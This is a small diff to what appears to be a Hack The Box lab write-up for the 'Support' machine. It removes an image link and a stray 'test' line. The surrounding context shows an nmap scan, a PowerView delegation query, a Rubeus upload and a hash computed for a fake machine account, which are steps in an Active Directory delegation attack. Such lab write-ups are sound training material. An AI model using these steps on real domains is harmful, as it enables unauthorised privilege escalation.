@@ -1,5 +1,3 @@
-![image](https://github.com/regarmulia/HTB/assets/33616880/e4ddfec3-a99b-4b8a-9b9b-590cd649863a)
-
 ```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.174
 ```
@@ -113,7 +111,6 @@ Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
 
 
 ```
-test
 upload Rubeus.exe
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 58A478135A93AC3BF058A5EA0E8FDB71
